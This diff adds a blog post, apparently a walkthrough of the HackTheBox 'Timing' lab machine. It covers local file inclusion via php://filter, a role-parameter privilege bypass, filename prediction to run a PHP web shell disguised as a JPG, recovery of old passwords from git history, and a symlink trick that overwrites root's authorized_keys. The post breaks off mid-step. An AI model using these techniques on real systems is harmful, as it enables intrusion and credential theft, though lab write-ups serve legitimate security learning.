@@ -1,0 +1,868 @@
+---
+title: Hackthebox Timing Writeup
+slug: hackthebox-timing-writeup
+description: Hackthebox release new machine called timing, in this machine we need to first find LFI with some fuzzing through LFI we need to dump the sorce code of file and get useful information and get the admin panel through admin panel we will upload imges abusing that function to get RFI and dump the git directory to find old password and get ssh session after that abuse the netutils to overwrite the authorized_keys.
+date: 2021-12-22
+image: hackthebox-timing-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.11.135
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-21 23:05 CST
+Nmap scan report for 10.10.11.135
+Host is up (0.091s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
+|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
+|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Simple WebApp
+|_Requested resource was ./login.php
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.38 seconds
+```
+
+There are two ports open `22:ssh,80:http`
+
+## Port-80
+
+It's a `simple` login page.
+
+Trying default `username` password but `nothing` work.
+
+<FixTheImageURL src='web.png' slug='hackthebox-timing-writeup' />
+
+Let's run `gobuster`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ gobuster dir -u http://10.10.11.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.135/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2021/12/21 23:22:09 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 313] [--> http://10.10.11.135/images/]
+/login.php            (Status: 200) [Size: 5609]
+/index.php            (Status: 302) [Size: 0] [--> ./login.php]
+/profile.php          (Status: 302) [Size: 0] [--> ./login.php]
+/image.php            (Status: 200) [Size: 0]
+/header.php           (Status: 302) [Size: 0] [--> ./login.php]
+/footer.php           (Status: 200) [Size: 3937]
+/upload.php           (Status: 302) [Size: 0] [--> ./login.php]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.11.135/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.11.135/js/]
+/logout.php           (Status: 302) [Size: 0] [--> ./login.php]
+```
+
+All pages redirect to `login.php` except `/image` and `image.php`.
+
+Let's first go to `/images`
+
+<FixTheImageURL src='web1.png' slug='hackthebox-timing-writeup' />
+
+Forbidden! let's check `image.php`
+
+<FixTheImageURL src='web2.png' slug='hackthebox-timing-writeup' />
+
+And we see `image.php` don't give any error or `redirect`. i think this page accept some get or post `parameter` because when we upload any `php` shell through images it's also need `parameter` and if we don't pass any they give us `blank` page like this.
+
+Let's find the parameter with `wfuzz`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ wfuzz -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -t 50 --hh 0
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.135/image.php?FUZZ=/etc/passwd
+Total requests: 2588
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000360:   200        0 L      3 W        25 Ch       "img"
+
+Total time: 8.155825
+Processed Requests: 2588
+Filtered Requests: 2587
+Requests/sec.: 317.3192
+```
+
+Found the `parameter` let's check if it has `LFI` or not.
+
+<FixTheImageURL src='web3.png' slug='hackthebox-timing-writeup' />
+
+And it's said `hacking attempt detected!`
+
+Let's use php `base64` filter to check if it's still the same `scenario`.
+
+```js
+http://10.10.11.135/image.php?img=php://filter/convert.base64-decoder/resource=/etc/passwd
+```
+
+<FixTheImageURL src='web4.png' slug='hackthebox-timing-writeup' />
+
+And it's `work!`
+
+## Passwd File
+
+```js
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
+```
+
+Got aaron user inside `/etc/passwd` file.
+
+Let's check the `login.php` file with LFI.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=login.php | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2764  100  2764    0     0  15885      0 --:--:-- --:--:-- --:--:-- 15885
+<?php
+
+include "header.php";
+
+function createTimeChannel()
+{
+    sleep(1);
+}
+
+include "db_conn.php";
+
+if (isset($_SESSION['userid'])){
+    header('Location: ./index.php');
+    die();
+}
+
+
+if (isset($_GET['login'])) {
+    $username = $_POST['user'];
+    $password = $_POST['password'];
+
+    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
+    $result = $statement->execute(array('username' => $username));
+    $user = $statement->fetch();
+
+    if ($user !== false) {
+        createTimeChannel();
+        if (password_verify($password, $user['password'])) {
+            $_SESSION['userid'] = $user['id'];
+            $_SESSION['role'] = $user['role'];
+            header('Location: ./index.php');
+            return;
+        }
+    }
+    $errorMessage = "Invalid username or password entered";
+
+
+}
+?>
+<?php
+if (isset($errorMessage)) {
+
+    ?>
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-10 col-md-offset-1">
+                <div class="alert alert-danger alert-dismissible fade in text-center" role="alert"><strong>
+
+                        <?php echo $errorMessage; ?>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <?php
+}
+?>
+    <link rel="stylesheet" href="./css/login.css">
+
+    <div class="wrapper fadeInDown">
+        <div id="formContent">
+            <div class="fadeIn first" style="padding: 20px">
+                <img src="./images/user-icon.png" width="100" height="100"/>
+            </div>
+
+            <form action="?login=true" method="POST">
+
+                <input type="text" id="login" class="fadeIn second" name="user" placeholder="login">
+
+                <input type="text" id="password" class="fadeIn third" name="password" placeholder="password">
+
+                <input type="submit" class="fadeIn fourth" value="Log In">
+
+            </form>
+
+
+            <!-- todo -->
+            <div id="formFooter">
+                <a class="underlineHover" href="#">Forgot Password?</a>
+            </div>
+
+        </div>
+    </div>
+
+
+<?php
+include "footer.php";
+```
+
+If you look at the `login.php` file it's include db file called `db_conn.php`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   124  100   124    0     0    720      0 --:--:-- --:--:-- --:--:--   720
+<?php
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
+```
+
+Got the `database` password but i try this on `login` page and ssh through `aaron` but nothing work.
+
+Let's check the `upload.php` file which we found in `gobuster` result.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1360  100  1360    0     0   8095      0 --:--:-- --:--:-- --:--:--  8095
+<?php
+include("admin_auth_check.php");
+
+$upload_dir = "images/uploads/";
+
+if (!file_exists($upload_dir)) {
+    mkdir($upload_dir, 0777, true);
+}
+
+$file_hash = uniqid();
+
+$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
+$target_file = $upload_dir . $file_name;
+$error = "";
+$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+
+if (isset($_POST["submit"])) {
+    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+    if ($check === false) {
+        $error = "Invalid file";
+    }
+}
+
+// Check if file already exists
+if (file_exists($target_file)) {
+    $error = "Sorry, file already exists.";
+}
+
+if ($imageFileType != "jpg") {
+    $error = "This extension is not allowed.";
+}
+
+if (empty($error)) {
+    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+        echo "The file has been uploaded.";
+    } else {
+        echo "Error: There was an error uploading your file.";
+    }
+} else {
+    echo "Error: " . $error;
+}
+?>
+```
+
+Before uploading it's checking on `admin_auth_check.php` let's check that file `first`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   268  100   268    0     0   1558      0 --:--:-- --:--:-- --:--:--  1549
+<?php
+
+include_once "auth_check.php";
+
+if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
+    echo "No permission to access this panel!";
+    header('Location: ./index.php');
+    die();
+}
+?>
+```
+
+It's `checking` that if our session `role id` is equal to 1 or not if not it's `redirect` to index.php.
+
+But the `question` is what's the username and `password` of login page? after some time i try username `aaron` and password is also aaron and it's `work`.
+
+<FixTheImageURL src='web5.png' slug='hackthebox-timing-writeup' />
+
+And it's said `user 2` but we need our role `id = 1` for that we need to `find` a way let's check the edit `profile` tab.
+
+<FixTheImageURL src='web6.png' slug='hackthebox-timing-writeup' />
+
+Let's check the source code of `profile.php` with that `LFI`.
+
+<FixTheImageURL src='web7.png' slug='hackthebox-timing-writeup' />
+
+it's submit the `form` with help of `js`.
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-timing-writeup' />
+
+It's `sending` the form data to `profile_update.php`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=js/profile.js | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   852  100   852    0     0   5011      0 --:--:-- --:--:-- --:--:--  5041
+function updateProfile() {
+    var xml = new XMLHttpRequest();
+    xml.onreadystatechange = function () {
+        if (xml.readyState == 4 && xml.status == 200) {
+            document.getElementById("alert-profile-update").style.display = "block"
+        }
+    };
+
+    xml.open("POST", "profile_update.php", true);
+    xml.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xml.send("firstName=" + document.getElementById("firstName").value + "&lastName=" + document.getElementById("lastName").value + "&email=" + document.getElementById("email").value + "&company=" + document.getElementById("company").value);
+}
+```
+
+Let's check the `profile_update.php` file.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=profile_update.php | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2320  100  2320    0     0  12888      0 --:--:-- --:--:-- --:--:-- 12888
+<?php
+
+include "auth_check.php";
+
+$error = "";
+
+if (empty($_POST['firstName'])) {
+    $error = 'First Name is required.';
+} else if (empty($_POST['lastName'])) {
+    $error = 'Last Name is required.';
+} else if (empty($_POST['email'])) {
+    $error = 'Email is required.';
+} else if (empty($_POST['company'])) {
+    $error = 'Company is required.';
+}
+
+if (!empty($error)) {
+    die("Error updating profile, reason: " . $error);
+} else {
+
+    include "db_conn.php";
+
+    $id = $_SESSION['userid'];
+    $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
+    $result = $statement->execute(array('id' => $id));
+    $user = $statement->fetch();
+
+    if ($user !== false) {
+
+        ini_set('display_errors', '1');
+        ini_set('display_startup_errors', '1');
+        error_reporting(E_ALL);
+
+        $firstName = $_POST['firstName'];
+        $lastName = $_POST['lastName'];
+        $email = $_POST['email'];
+        $company = $_POST['company'];
+        $role = $user['role'];
+
+        if (isset($_POST['role'])) {
+            $role = $_POST['role'];
+            $_SESSION['role'] = $role;
+        }
+
+
+        // dont persist role
+        $sql = "UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id";
+
+        $stmt = $pdo->prepare($sql);
+        $stmt->execute();
+
+        $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
+        $result = $statement->execute(array('id' => $id));
+        $user = $statement->fetch();
+
+        // but return it to avoid confusion
+        $user['role'] = $role;
+        $user['6'] = $role;
+
+        echo json_encode($user, JSON_PRETTY_PRINT);
+
+    } else {
+        echo "No user with this id was found.";
+    }
+
+}
+
+?>
+```
+
+And we see if we specify `role=1` in the profile `update` form. it's set the session `role id=1`.
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-timing-writeup' />
+
+Now let's `submit` the form and `intercept` the req in burp.
+
+<FixTheImageURL src='web8.png' slug='hackthebox-timing-writeup' />
+
+Add the `&role=1` in last and `send` the req.
+
+<FixTheImageURL src='burp.png' slug='hackthebox-timing-writeup' />
+
+Now go to the `home` page or `reload` the page.
+
+<FixTheImageURL src='web9.png' slug='hackthebox-timing-writeup' />
+
+And we see a new `link` appear `Admin Panel` let's go to that page.
+
+<FixTheImageURL src='web10.png' slug='hackthebox-timing-writeup' />
+
+And we see we can `upload` avatar image now let's check the source code of `upload.php` page.
+
+<FixTheImageURL src='web11.png' slug='hackthebox-timing-writeup' />
+
+And we see the process of `uploading` file
+
+1. it's check if it is `jpg` or not
+2. it's create a file name with `md5` hash
+3. inside md5 `function` it's using $file_hash which `interpreted` as string because it's using `single` cot rather than double cot you can `read` about that more in article
+4. but the time function is return `dynamic` value
+5. and then the `file_name`
+
+Link : https://www.geeksforgeeks.org/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php/#:~:text=Double%2Dquoted%20strings%3A%20By%20using,variables%20directly%20within%20the%20string.&text=Each%20variable%20will%20be%20replaced%20by%20its%20value
+
+<FixTheImageURL src='cmd2.png' slug='hackthebox-timing-writeup' />
+
+Now to get the `name` of the file i create a `python` script to get that.
+
+## Exploit.py
+
+```js
+import time
+import hashlib
+
+while True:
+    print(f"hash = {hashlib.md5('$file_hash'.encode()+str(int(time.time())).encode()).hexdigest()}")
+    time.sleep(1)
+```
+
+Now let's create a `jpg` file which has php code `inside` that.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[/home/dedsec/Downloads/www]
+└──╼ [★]$ cat dedsec.jpg
+<?php system($_GET[dedsec]);?>
+```
+
+Before `uploading` the file start the `python` script first.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ python3 exploit.py
+```
+
+Now `upload` the file.
+
+<FixTheImageURL src='web12.png' slug='hackthebox-timing-writeup' />
+
+Now check every `single` hash which generated by `python` script and try to send the `req` with that hash with `curl`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl 'http://10.10.11.135/image.php?img=images/uploads/11c9776e30e9f474734c1aab85f1102a_dedsec.jpg&dedsec=id'
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl 'http://10.10.11.135/image.php?img=images/uploads/8303d2315176ef5e4f8d27db11525ee2_dedsec.jpg&dedsec=id'
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl 'http://10.10.11.135/image.php?img=images/uploads/dc1c96720db5b676ce16744ded6b6482_dedsec.jpg&dedsec=id'
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl 'http://10.10.11.135/image.php?img=images/uploads/b4a4cc1422fd48eb3ea2a4b14e9086e4_dedsec.jpg&dedsec=id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-timing-writeup' />
+
+And we got the `RCE`
+
+But the `problem` is we can't get the `rev shell` back because of `ip table` rules.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl 'http://10.10.11.135/image.php?img=images/uploads/b4a4cc1422fd48eb3ea2a4b14e9086e4_dedsec.jpg&dedsec=ls'
+admin_auth_check.php
+auth_check.php
+avatar_uploader.php
+css
+db_conn.php
+footer.php
+header.php
+image.php
+images
+index.php
+js
+login.php
+logout.php
+profile.php
+profile_update.php
+upload.php
+```
+
+After some `enumeration` i find a zip file called `source-files-backup.zip`
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl 'http://10.10.11.135/image.php?img=images/uploads/b4a4cc1422fd48eb3ea2a4b14e9086e4_dedsec.jpg&dedsec=ls+-al+/opt/'
+total 624
+drwxr-xr-x  2 root root   4096 Dec  2 11:19 .
+drwxr-xr-x 24 root root   4096 Nov 29 01:34 ..
+-rw-r--r--  1 root root 627851 Jul 20 22:36 source-files-backup.zip
+```
+
+I copy that zip file in `/var/www/html`
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing]
+└──╼ [★]$ curl 'http://10.10.11.135/image.php?img=images/uploads/b4a4cc1422fd48eb3ea2a4b14e9086e4_dedsec.jpg&dedsec=cp+/opt/source-files-backup.zip+/var/www/html/'
+```
+
+Now `download` that zip file.
+
+<FixTheImageURL src='web13.png' slug='hackthebox-timing-writeup' />
+
+Let's `unzip` the file.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing/www]
+└──╼ [★]$ ls -al
+total 616
+drwxr-xr-x 1 root   root       46 Dec 22 01:08 .
+drwxr-xr-x 1 root   root       54 Dec 22 01:08 ..
+-rw-r--r-- 1 dedsec dedsec 627851 Dec 22 01:07 source-files-backup.zip
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing/www]
+└──╼ [★]$ unzip source-files-backup.zip
+```
+
+And we see there `.git` directory let's dump all `commits` in the background.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing/www]
+└──╼ [★]$ ls -al backup/
+total 52
+drwxr-xr-x 1 root root  350 Jul 20 17:34 .
+drwxr-xr-x 1 root root   74 Dec 22 01:12 ..
+-rw-r--r-- 1 root root  200 Jul 20 17:34 admin_auth_check.php
+-rw-r--r-- 1 root root  373 Jul 20 17:34 auth_check.php
+-rw-r--r-- 1 root root 1268 Jul 20 17:34 avatar_uploader.php
+drwxr-xr-x 1 root root   52 Jul 20 17:34 css
+-rw-r--r-- 1 root root   92 Jul 20 17:34 db_conn.php
+-rw-r--r-- 1 root root 3937 Jul 20 17:34 footer.php
+drwxr-xr-x 1 root root  144 Jul 20 17:35 .git
+-rw-r--r-- 1 root root 1498 Jul 20 17:34 header.php
+-rw-r--r-- 1 root root  507 Jul 20 17:34 image.php
+drwxr-xr-x 1 root root   68 Jul 20 17:34 images
+-rw-r--r-- 1 root root  188 Jul 20 17:34 index.php
+drwxr-xr-x 1 root root  114 Jul 20 17:34 js
+-rw-r--r-- 1 root root 2074 Jul 20 17:34 login.php
+-rw-r--r-- 1 root root  113 Jul 20 17:34 logout.php
+-rw-r--r-- 1 root root 3041 Jul 20 17:34 profile.php
+-rw-r--r-- 1 root root 1740 Jul 20 17:34 profile_update.php
+-rw-r--r-- 1 root root  984 Jul 20 17:34 upload.php
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing/www]
+└──╼ [★]$ /opt/GitTools/Extractor/extractor.sh backup/ git_dump/
+```
+
+And there is `db_conn.php` file which has same `password` which we found in `LFI`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing/www/backup]
+└──╼ [★]$ ls -al
+total 52
+drwxr-xr-x 1 root root  350 Jul 20 17:34 .
+drwxr-xr-x 1 root root   74 Dec 22 01:12 ..
+-rw-r--r-- 1 root root  200 Jul 20 17:34 admin_auth_check.php
+-rw-r--r-- 1 root root  373 Jul 20 17:34 auth_check.php
+-rw-r--r-- 1 root root 1268 Jul 20 17:34 avatar_uploader.php
+drwxr-xr-x 1 root root   52 Jul 20 17:34 css
+-rw-r--r-- 1 root root   92 Jul 20 17:34 db_conn.php
+-rw-r--r-- 1 root root 3937 Jul 20 17:34 footer.php
+drwxr-xr-x 1 root root  144 Jul 20 17:35 .git
+-rw-r--r-- 1 root root 1498 Jul 20 17:34 header.php
+-rw-r--r-- 1 root root  507 Jul 20 17:34 image.php
+drwxr-xr-x 1 root root   68 Jul 20 17:34 images
+-rw-r--r-- 1 root root  188 Jul 20 17:34 index.php
+drwxr-xr-x 1 root root  114 Jul 20 17:34 js
+-rw-r--r-- 1 root root 2074 Jul 20 17:34 login.php
+-rw-r--r-- 1 root root  113 Jul 20 17:34 logout.php
+-rw-r--r-- 1 root root 3041 Jul 20 17:34 profile.php
+-rw-r--r-- 1 root root 1740 Jul 20 17:34 profile_update.php
+-rw-r--r-- 1 root root  984 Jul 20 17:34 upload.php
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing/www/backup]
+└──╼ [★]$ cat db_conn.php
+<?php
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
+```
+
+Let's check the `git commits` which we dump in the `background`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing/www/git_dump]
+└──╼ [★]$ ls -al
+total 0
+drwxr-xr-x 1 root root 168 Dec 22 01:12 .
+drwxr-xr-x 1 root root  74 Dec 22 01:12 ..
+drwxr-xr-x 1 root root 372 Dec 22 01:12 0-16de2698b5b122c93461298eab730d00273bd83e
+drwxr-xr-x 1 root root 372 Dec 22 01:12 1-e4e214696159a25c69812571c8214d2bf8736a3f
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing/www/git_dump]
+└──╼ [★]$ cat 0-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php && cat 1-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php
+<?php
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
+<?php
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
+```
+
+And we got the `different` password let's try this password with `ssh`.
+
+And we got the `user.txt` file.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Timing/www/git_dump]
+└──╼ [★]$ ssh aaron@10.10.11.135
+The authenticity of host '10.10.11.135 (10.10.11.135)' can't be established.
+ECDSA key fingerprint is SHA256:w5P4pFdNqpvCcxxisM5OCJz7a6chyDUrd1JQ14k5smY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.135' (ECDSA) to the list of known hosts.
+aaron@10.10.11.135's password:
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Dec 22 07:15:18 UTC 2021
+
+  System load:  0.0               Processes:           169
+  Usage of /:   48.9% of 4.85GB   Users logged in:     0
+  Memory usage: 11%               IP address for eth0: 10.10.11.135
+  Swap usage:   0%
+
+
+8 updates can be applied immediately.
+8 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+aaron@timing:~$ cat user.txt
+202727f3cc3d17a1a6f04f8d9df2e333
+```
+
+## Privilege escalation
+
+Before running `linPEAS` let's check manually.
+
+```js
+aaron@timing:~$ sudo -l
+Matching Defaults entries for aaron on timing:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User aaron may run the following commands on timing:
+    (ALL) NOPASSWD: /usr/bin/netutils
+```
+
+And we see we can `execute` netutils with root `permission` let's check the content inside `netutils`.
+
+```js
+aaron@timing:~$ sudo -l
+Matching Defaults entries for aaron on timing:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User aaron may run the following commands on timing:
+    (ALL) NOPASSWD: /usr/bin/netutils
+aaron@timing:~$ cat /usr/bin/netutils
+#! /bin/bash
+java -jar /root/netutils.jar
+aaron@timing:~$
+```
+
+It is running `netutils.jar` which is inside `root` folder so we can't view that.
+
+And we see it's get the `file` and place it on `aaron` home folder with `root` permission.
+
+<FixTheImageURL src='cmd4.png' slug='hackthebox-timing-writeup' />
+
+So i create a symlink of `/root/.ssh/authorized_keys` with keys so when we get the `file` with same name it's `overwrite` the content of `authorized_keys`.
+
+```js
+aaron@timing:~$ ln -s /root/.ssh/authorized_keys keys
+aaron@timing:~$ ls -al
+total 36
+drwxr-x--x 5 aaron aaron 4096 Dec 22 08:03 .
+drwxr-xr-x 3 root  root  4096 Dec  2 09:55 ..
+lrwxrwxrwx 1 root  root     9 Oct  5 15:33 .bash_history -> /dev/null
+-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc
+drwx------ 2 aaron aaron 4096 Nov 29 01:34 .cache
+drwx------ 3 aaron aaron 4096 Nov 29 01:34 .gnupg
+lrwxrwxrwx 1 aaron aaron   26 Dec 22 08:03 keys -> /root/.ssh/authorized_keys
+drwxrwxr-x 3 aaron aaron 4096 Nov 29 01:34 .local
+-rw-r--r-- 1 aaron aaron  807 Apr  4  2018 .profile
+-rw-r----- 1 root  aaron   33 Dec 22 08:01 user.txt
+lrwxrwxrwx 1 root  root     9 Oct  5 15:33 .viminfo -> /dev/null
+aaron@timing:~$
+```
+
+Now in `parrot` machine create a `ssh key` and rename or copy the `id_rsa.pub` to keys.
+
+And open `simple http server`.
+
+```js
